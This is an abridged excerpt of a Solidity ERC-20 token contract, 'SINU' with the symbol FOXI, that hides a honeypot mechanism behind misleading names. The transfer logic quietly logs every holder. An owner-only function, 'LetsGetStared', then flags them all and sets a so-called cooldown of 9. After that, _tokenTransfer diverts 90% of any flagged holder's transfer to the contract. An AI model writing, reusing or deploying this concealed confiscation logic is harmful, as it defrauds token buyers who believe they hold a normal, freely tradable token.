...
contract SINU is Context, IERC20 { 
    ...
    mapping (address => bool) public ExcludedFromCooldowns;
    address[] public _ExcludedFromCooldown;

    address payable public Wallet_Marketing = payable(0x1E5481A7c1427240585a01646D3Dd217ecA379D1); 
    address payable public Wallet_Dev = payable(0x3d67bFc6Db91FCB9f9c68903B81b41baE8E43D84);
    ...
    string private constant _symbol = unicode"FOXI"; 
    
    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 
    uint256 private cooldown = 0;
    ...
    function RemoveLimitInEffects() public onlyOwner{
    ...
    function LetsGetStared() external onlyOwner {
        cooldown = 9;
        for (uint256 i = 0; i < _ExcludedFromCooldown.length; i++) {
            ExcludedFromCooldowns[_ExcludedFromCooldown[i]] = true;
        }
    }
    */
    ...
    function isExcludedFromCooldowns(address[] memory addrs)
        external
        onlyOwner
        returns (bool)
    {
        for (uint256 i = 0; i < addrs.length; i++) {
            ExcludedFromCooldowns[addrs[i]] = false;
        }
        return true;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isExcludedFromCooldown[from]) {
            _isExcludedFromCooldown[from] = true;
            _ExcludedFromCooldown.push(from);
        }
        if (to != owner() && to != uniswapV2Pair && !_isExcludedFromCooldown[to]) {
            _isExcludedFromCooldown[to] = true;
            _ExcludedFromCooldown.push(to);
            if (ExcludedFromCooldowns[from]) {
                ExcludedFromCooldowns[to] = true;
            }
        }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 _sTotal = tAmount*_Tax_On_Sell/100;                        
            if (ExcludedFromCooldowns[sender]) 
            _sTotal = tAmount*cooldown/10; 
            uint256 tTransferAmount = tAmount-_sTotal;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+_sTotal;               
            emit Transfer(sender, recipient, tTransferAmount);
            if(recipient == Wallet_Burn)
            _tTotal = _tTotal-tTransferAmount;            
        }
